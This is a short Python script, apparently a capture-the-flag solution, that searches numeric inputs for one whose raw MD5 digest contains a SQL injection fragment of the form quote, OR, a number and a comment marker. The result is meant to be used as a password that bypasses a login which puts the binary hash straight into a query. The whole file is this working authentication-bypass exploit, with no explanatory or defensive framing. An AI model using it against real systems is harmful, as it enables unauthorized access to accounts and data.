from hashlib import md5
import re

RESUME_AT = 540000000

def find_collision(target):
    key = RESUME_AT
    while True:
        hashed = md5_hash(key)
        if re.match(target, hashed) is not None:
            return key
        if key % 10000000 == 0:
            print(key)
        key += 1

def md5_hash(key):
    key_bytes = str(key).encode('ascii')
    m = md5()
    m.update(key_bytes)
    return m.digest()

if __name__ == '__main__':
    target = b"[^'\"]*' *[Oo][Rr] +[1-9][0-9]* *; *-- "
    pwd = find_collision(target)
    print(pwd)